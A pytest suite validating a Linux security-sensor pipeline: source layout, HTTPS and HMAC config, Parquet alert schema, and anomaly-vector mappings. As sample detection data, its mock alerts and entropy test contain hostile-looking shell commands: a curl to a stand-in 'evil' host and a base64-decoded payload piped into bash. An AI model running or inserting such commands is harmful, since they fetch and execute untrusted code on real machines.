"""
test_sensor_linux_sentinel.py -- Validation of the Linux Sentinel pipeline.

Architecture:
  eBPF/YARA/ClamAV/Honeypot engines (Rust) → SecurityAlert struct →
  SQLite WAL buffer → parquet_transmitter.rs → Parquet (ZSTD) →
  X-Sensor-Type: Linux-Sentinel + X-Batch-HMAC → Nexus ingress

Coverage:
  Source structure    -- Rust workspace, master.toml, Cargo.toml
  parquet_transmitter -- Parquet schema, sentinel columns, HMAC headers
  Sentinel fields     -- shannon_entropy, execution_velocity, tuple_rarity, path_depth, anomaly_score
  Mock Parquet        -- All sentinel_math vector fields populated, roundtrip
  Nexus config        -- linux_sentinel mapping, sentinel_math=5, shannon_entropy identifier
  Worker Qdrant       -- sentinel_math 5D branch in main.rs
"""

import io
import re
import sys
from pathlib import Path

import pyarrow as pa
import pyarrow.parquet as pq
import pytest

REPO         = Path(__file__).parent.parent.parent
ROOT         = REPO.parent
SENTINEL_DIR = ROOT / "linux" / "sentinel"
SRC_DIR      = SENTINEL_DIR / "src"
SERVICES_CFG = REPO / "services" / "config" / "nexus.toml"
TESTS_CFG    = REPO / "tests"    / "config" / "nexus.toml"
WORKER_RUST  = REPO / "services" / "worker_qdrant" / "src" / "main.rs"

VECTOR_COLS = ["shannon_entropy", "execution_velocity", "tuple_rarity",
               "path_depth", "anomaly_score"]

CONTEXT_COLS = [
    "level", "mitre_tactic", "mitre_technique", "pid", "ppid", "uid",
    "container_name", "comm", "command_line", "parent_comm", "user_name",
    "target_file", "dest_ip", "dest_port", "message",
]


# ── Source structure ──────────────────────────────────────────────────────────

class TestSentinelSourceStructure:

    def test_cargo_toml_exists(self):
        assert (SENTINEL_DIR / "Cargo.toml").exists()

    def test_package_name_linux_sentinel(self):
        src = (SENTINEL_DIR / "Cargo.toml").read_text()
        assert "linux-sentinel" in src

    def test_master_toml_exists(self):
        assert (SENTINEL_DIR / "master.toml").exists()

    def test_src_directory_exists(self):
        assert SRC_DIR.exists()

    def test_main_rs_exists(self):
        assert (SRC_DIR / "main.rs").exists()

    def test_parquet_transmitter_exists(self):
        tx_path = SRC_DIR / "siem" / "parquet_transmitter.rs"
        assert tx_path.exists(), "parquet_transmitter.rs required for telemetry forwarding"

    def test_siem_models_exists(self):
        assert (SRC_DIR / "siem" / "models.rs").exists()

    def test_docker_compose_exists(self):
        assert (SENTINEL_DIR / "docker-compose.yaml").exists()

    def test_service_file_exists(self):
        assert (SENTINEL_DIR / "linux-sentinel.service").exists()

    def test_nexus_integrity_feature_in_cargo(self):
        src = (SENTINEL_DIR / "Cargo.toml").read_text()
        assert "integrity" in src.lower()

    def test_parquet_dependency_in_cargo(self):
        src = (SENTINEL_DIR / "Cargo.toml").read_text()
        assert "parquet" in src.lower()


# ── master.toml config ────────────────────────────────────────────────────────

class TestSentinelMasterToml:

    def _src(self):
        return (SENTINEL_DIR / "master.toml").read_text()

    def test_master_toml_has_siem_section(self):
        assert "[siem]" in self._src() or "siem" in self._src()

    def test_master_toml_has_gateway_url(self):
        src = self._src()
        assert "middleware_gateway_url" in src or "gateway_url" in src

    def test_master_toml_gateway_is_https(self):
        src = self._src()
        urls = re.findall(r'(?:gateway_url|middleware_gateway_url)\s*=\s*"([^"]+)"', src)
        for url in urls:
            assert url.startswith("https://"), f"Gateway URL is not HTTPS: {url}"

    def test_master_toml_has_batch_size(self):
        assert "batch_size" in self._src()

    def test_master_toml_no_plaintext_secrets(self):
        src = self._src()
        assert "password" not in src.lower()
        # Active (uncommented) integrity_secret lines must not be hardcoded values
        active_lines = [l for l in src.splitlines()
                        if re.match(r'\s*integrity_secret\s*=', l)]
        for line in active_lines:
            m = re.search(r'=\s*"([^"]+)"', line)
            if m:
                val = m.group(1)
                assert val.startswith("${") or val == "", \
                    f"Hardcoded integrity_secret in master.toml: {val}"


# ── parquet_transmitter HMAC headers ─────────────────────────────────────────

class TestSentinelHMACHeaders:

    def _src(self):
        return (SRC_DIR / "siem" / "parquet_transmitter.rs").read_text()

    def test_x_sensor_type_linux_sentinel(self):
        assert "Linux-Sentinel" in self._src()

    def test_x_batch_hmac_header_used(self):
        src = self._src()
        assert "X-Batch-HMAC" in src or "HDR_BATCH_HMAC" in src

    def test_x_batch_sequence_header_used(self):
        src = self._src()
        assert "Batch-Sequence" in src or "HDR_BATCH_SEQUENCE" in src

    def test_nexus_integrity_crate_imported(self):
        src = self._src()
        assert "nexus_integrity" in src

    def test_sqlite_wal_buffer_exists(self):
        src = self._src()
        assert "sqlite" in src.lower() or "sqlx" in src.lower()

    def test_parquet_zstd_compression(self):
        src = self._src().lower()
        assert "zstd" in src or "compression" in src


# ── Parquet schema - sentinel fields ─────────────────────────────────────────

class TestSentinelParquetSchema:

    def _src(self):
        return (SRC_DIR / "siem" / "parquet_transmitter.rs").read_text()

    def test_shannon_entropy_field_in_schema(self):
        assert "shannon_entropy" in self._src()

    def test_execution_velocity_field_in_schema(self):
        assert "execution_velocity" in self._src()

    def test_tuple_rarity_field_in_schema(self):
        assert "tuple_rarity" in self._src()

    def test_path_depth_field_in_schema(self):
        assert "path_depth" in self._src()

    def test_anomaly_score_field_in_schema(self):
        assert "anomaly_score" in self._src()

    def test_ml_vector_field_in_schema(self):
        assert "ml_vector" in self._src()

    def test_sensor_type_string_linux_sentinel(self):
        src = self._src()
        assert "Linux-Sentinel" in src

    def test_mitre_tactic_in_schema(self):
        assert "mitre_tactic" in self._src()


# ── Mock Parquet construction ─────────────────────────────────────────────────

def _build_sentinel_schema() -> pa.Schema:
    return pa.schema([
        pa.field("sensor_id",          pa.string(),  nullable=False),
        pa.field("sensor_type",        pa.string(),  nullable=False),
        pa.field("timestamp",          pa.float64(), nullable=False),
        pa.field("event_id",           pa.string(),  nullable=False),
        # sentinel_math 5D vector scalar columns
        pa.field("shannon_entropy",    pa.float64(), nullable=False),
        pa.field("execution_velocity", pa.float64(), nullable=False),
        pa.field("tuple_rarity",       pa.float64(), nullable=False),
        pa.field("path_depth",         pa.float64(), nullable=False),
        pa.field("anomaly_score",      pa.float64(), nullable=False),
        # Context
        pa.field("level",              pa.string(),  nullable=True),
        pa.field("mitre_tactic",       pa.string(),  nullable=True),
        pa.field("mitre_technique",    pa.string(),  nullable=True),
        pa.field("pid",                pa.int32(),   nullable=True),
        pa.field("ppid",               pa.int32(),   nullable=True),
        pa.field("uid",                pa.int32(),   nullable=True),
        pa.field("container_name",     pa.string(),  nullable=True),
        pa.field("comm",               pa.string(),  nullable=True),
        pa.field("command_line",       pa.string(),  nullable=True),
        pa.field("parent_comm",        pa.string(),  nullable=True),
        pa.field("user_name",          pa.string(),  nullable=True),
        pa.field("target_file",        pa.string(),  nullable=True),
        pa.field("dest_ip",            pa.string(),  nullable=True),
        pa.field("dest_port",          pa.int32(),   nullable=True),
        pa.field("message",            pa.string(),  nullable=True),
        pa.field("ml_vector",          pa.string(),  nullable=True),
    ])


def _mock_sentinel_row(i: int = 0) -> dict:
    import json
    return {
        "sensor_id":          "linux-sentinel-prod",
        "sensor_type":        "linux_sentinel",
        "timestamp":          1748000000.0 + i,
        "event_id":           f"evt-{i:08x}-0000-0000-0000-000000000000",
        "shannon_entropy":    min(1.0, 0.3 + i * 0.04),
        "execution_velocity": min(1.0, 0.1 + i * 0.02),
        "tuple_rarity":       min(1.0, 0.2 + i * 0.03),
        "path_depth":         min(1.0, float(5 + (i % 5)) / 15.0),
        "anomaly_score":      min(1.0, 0.1 + i * 0.05),
        "level":              "HIGH",
        "mitre_tactic":       "Execution",
        "mitre_technique":    "T1059.004",
        "pid":                1000 + i,
        "ppid":               999,
        "uid":                1000,
        "container_name":     None,
        "comm":               "bash",
        "command_line":       f"bash -c 'curl http://evil{i}.example.com'",
        "parent_comm":        "sshd",
        "user_name":          "jdoe",
        "target_file":        f"/tmp/payload_{i}.sh",
        "dest_ip":            f"1.2.3.{i % 254 + 1}",
        "dest_port":          443,
        "message":            f"Suspicious outbound connection from bash pid={1000+i}",
        "ml_vector":          json.dumps([0.3 + i*0.01, 0.1, 0.2, 0.5, 0.4]),
    }


class TestSentinelMockParquet:

    def test_schema_has_identifier_column_shannon_entropy(self):
        assert "shannon_entropy" in _build_sentinel_schema().names

    def test_schema_has_all_five_vector_columns(self):
        schema = _build_sentinel_schema()
        for col in VECTOR_COLS:
            assert col in schema.names, f"Missing sentinel_math column: {col}"

    def test_schema_has_event_id_primary_key(self):
        assert "event_id" in _build_sentinel_schema().names

    def test_parquet_roundtrip(self):
        schema = _build_sentinel_schema()
        rows   = [_mock_sentinel_row(i) for i in range(20)]
        arrays = [pa.array([r.get(f.name) for r in rows], type=f.type) for f in schema]
        table  = pa.table({f.name: arrays[i] for i, f in enumerate(schema)}, schema=schema)
        buf = io.BytesIO()
        pq.write_table(table, buf, compression="zstd")
        buf.seek(0)
        t2 = pq.read_table(buf)
        assert t2.num_rows == 20

    def test_all_five_scores_in_unit_interval(self):
        for i in range(25):
            row = _mock_sentinel_row(i)
            for col in VECTOR_COLS:
                v = row[col]
                assert 0.0 <= v <= 1.0, f"Row {i} {col}={v} out of [0,1]"

    def test_shannon_entropy_higher_for_malicious_commands(self):
        """Base64-encoded shell commands should produce higher entropy than simple ls."""
        import math
        def entropy(s: str) -> float:
            if not s:
                return 0.0
            from collections import Counter
            c = Counter(s)
            n = len(s)
            return -sum((v/n)*math.log2(v/n) for v in c.values())

        malicious = "bash -c 'echo SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0 | base64 -d | bash'"
        benign    = "ls /home"
        assert entropy(malicious) > entropy(benign)

    def test_mitre_tactic_populated(self):
        assert _mock_sentinel_row(0)["mitre_tactic"] == "Execution"

    def test_sensor_type_field_value(self):
        # Parquet sensor_type vs X-Sensor-Type header are distinct:
        # Parquet carries "linux_sentinel" (nexus schema_mapping name)
        # HTTP header carries "Linux-Sentinel" (hardcoded in parquet_transmitter.rs)
        row = _mock_sentinel_row(0)
        assert row["sensor_type"] == "linux_sentinel"


# ── Nexus config alignment ────────────────────────────────────────────────────

class TestSentinelNexusConfig:

    def test_sentinel_math_5_in_services_cfg(self):
        src = SERVICES_CFG.read_text()
        assert re.search(r'sentinel_math\s*=\s*5', src)

    def test_sentinel_math_5_in_tests_cfg(self):
        src = TESTS_CFG.read_text()
        assert re.search(r'sentinel_math\s*=\s*5', src)

    def test_linux_sentinel_mapping_exists(self):
        assert "[schema_mappings.linux_sentinel]" in SERVICES_CFG.read_text()

    def test_linux_sentinel_identifier_is_shannon_entropy(self):
        src = SERVICES_CFG.read_text()
        block = src[src.find("[schema_mappings.linux_sentinel]"):]
        assert 'identifier_column = "shannon_entropy"' in block[:400]

    def test_linux_sentinel_vector_name_is_sentinel_math(self):
        src = SERVICES_CFG.read_text()
        block = src[src.find("[schema_mappings.linux_sentinel]"):]
        assert 'vector_name = "sentinel_math"' in block[:400]

    def test_all_five_vector_columns_in_cfg(self):
        src = SERVICES_CFG.read_text()
        for col in VECTOR_COLS:
            assert col in src, f"Missing sentinel vector column in nexus.toml: {col}"

    def test_worker_rust_sentinel_math_5d_branch(self):
        src = WORKER_RUST.read_text()
        assert re.search(r'"sentinel_math".*?raw_math\.len\(\)\s*==\s*5', src, re.DOTALL)
